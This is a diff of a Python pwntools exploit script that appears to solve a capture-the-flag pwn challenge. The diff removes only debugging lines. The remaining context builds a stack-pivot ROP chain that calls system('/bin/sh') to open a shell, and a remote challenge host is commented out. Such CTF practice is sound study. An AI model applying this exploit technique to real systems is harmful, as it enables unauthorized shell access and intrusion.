@@ -6,10 +6,6 @@ from ctypes import *
 # log_level = 'debug'
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 
-context.terminal = ["wt.exe", "nt" ,"bash" ,"-c"]
-# context.terminal = ['tmux', 'splitw', '-h']
-# context.terminal = ['bash']
-
 # host = "node.yuzhian.com.cn"
 # ip = socket.gethostbyname(host)
 # r = remote(ip,37506)#远程连接
@@ -28,7 +24,6 @@ leave_ret_addr = 0x4012D6
 pop_rdi_addr = 0x4013d3
 system_addr = elf.sym['system']
 
-gdb.attach(r, 'b *0x4012BA')
 pause()
 #                (                 ROP                    )           /bin/sh                         (栈迁移的地址-8)         leave_ret
 r.send(p64(pop_rdi_addr) + p64(gift_addr+24) + p64(system_addr) + b'/bin/sh\x00'.ljust(8, b'\x00') + p64(gift_addr-8) + p64(leave_ret_addr))
